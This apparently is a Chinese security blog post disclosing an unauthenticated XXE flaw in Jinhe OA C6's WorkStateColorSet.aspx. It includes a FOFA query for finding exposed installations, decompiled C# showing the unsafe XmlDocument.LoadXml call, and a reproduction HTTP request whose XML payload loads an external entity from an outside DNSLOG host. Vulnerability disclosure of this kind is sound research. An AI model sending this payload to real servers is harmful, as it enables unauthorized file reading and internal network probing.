---
title: "金和OA WorkStateColorSet.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-WorkStateColorSet-xxe.html
asset_dir: assets/金和oa-workstatecolorset.aspx-xxe漏洞
---

# 金和OA WorkStateColorSet.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/1/24 13:31
- 186浏览
- [0评论](#comment)
- 15分钟阅读

深入探索

技术文章订阅

安全运维咨询

软件

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `WorkStateColorSet.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞扫描服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `WorkStateColorSet.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Govset.dll` 将其进行反编译后找到 **WorkStateColorSet** 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  this.htc = ((CultureInfo) this.Session["culture"]).Name + ".css";
  this.Response.Buffer = true;
  this.Response.ExpiresAbsolute = DateTime.Now.AddSeconds(-1.0);
  this.Response.Expires = 0;
  this.Response.CacheControl = "no-cache";
  if (this.Request["state"] != null)
    this.iFlag = this.Request["state"].ToString().Trim();
  if (this.Request["Flag"] != null)
    this.strFlag = this.Request["Flag"].ToString().Trim();
  if (this.Request["ID"] != null)
    this.iID = this.Request["ID"].ToString().Trim();
  this.InitText();
  if (string.op_Inequality(this.strFlag, ""))
  {
    string end = ((TextReader) new StreamReader(this.Request.InputStream)).ReadToEnd();
    XmlDocument xmlDocument = new XmlDocument();
    xmlDocument.LoadXml(end);
    string innerText = xmlDocument.DocumentElement.ChildNodes[0].InnerText;
```

请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /c6/Jhsoft.Web.govset/WorkStateColorSet.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到请求

网络安全

[![金和OA WorkStateColorSet.aspx XXE漏洞](images/img-001-ab40f77f1ff8.webp)](https://image.mrxn.net/b12efeef8c1a4140adbccbbbda98c37e.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
